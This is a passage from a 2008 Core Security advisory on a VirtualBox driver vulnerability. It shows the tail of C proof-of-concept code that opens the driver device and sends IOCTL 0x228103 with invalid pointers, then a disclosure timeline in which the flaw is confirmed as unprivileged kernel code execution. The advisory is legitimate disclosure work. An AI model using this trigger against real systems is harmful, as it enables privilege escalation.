@@ -1,0 +1,74 @@
+     NULL) ) != INVALID_HANDLE_VALUE )
+
+  {
+    printf("Device %s succesfully opened!\n", szDevice);
+  }
+  else
+  {
+    printf("Error: Error opening device %s\n",szDevice);
+  }
+
+  cb = 0;
+  if (!DeviceIoControl(hDevice,
+
+        0x228103,
+        (LPVOID)0x80808080,0,
+        (LPVOID)0x80808080,0x0,
+        &cb,
+        NULL))
+  {
+    printf("Error in DeviceIo ... bytes returned %#x\n",cb);
+  }
+}
+
+
+- -----------/
+
+
+*Report Timeline*
+
+. 2008-07-16: Core Security Technologies notifies the VirtualBox team of
+the vulnerability.
+. 2008-07-17: Vendor acknowledges notification.
+. 2008-07-29: Core asks the vendor for a status update in the fixing
+
+process.
+. 2008-07-30: Vendor notifies a patched version will be publicly
+available on Monday 4th, August.
+. 2008-07-31: Core asks the vendor to provide URL to their alert and to
+confirm which versions are vulnerable and which version will include the
+
+fix.
+. 2008-07-31: CVE ID request sent to Mitre.
+. 2008-07-31: Bugtraq ID request sent to SecurityFocus.com.
+. 2008-07-31: CVE ID received from Mitre.
+. 2008-07-31: Bugtraq ID received SecurityFocus.com.
+. 2008-08-01: Vendor provides draft version of Sun Alert and URL to
+
+reference it.
+. 2008-08-01: Core updates its security advisory with information about
+vulnerable and non-vulnerable packages. Core provides its URL to the
+vendor and indicates that the vendor cataloged the issue as a Denial of
+
+Service bug but it should be considered a privilege escalation problem
+since it allows unprivileged users to execute code in the kernel context.
+. 2008-08-04: Vendor confirms that this issue can lead to arbitrary code
+
+execution by an unprivileged user.
+. 2008-08-04: CORE-2008-0716 advisory is published.
+
+
+*References*
+
+[1] Sun Welcomes Innotek - http://www.sun.com/software/innotek/.
+
+[2] http://www.sun.com/aboutsun/pr/2008-05/sunflash.20080529.1.xml.
+
+
+*About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas 
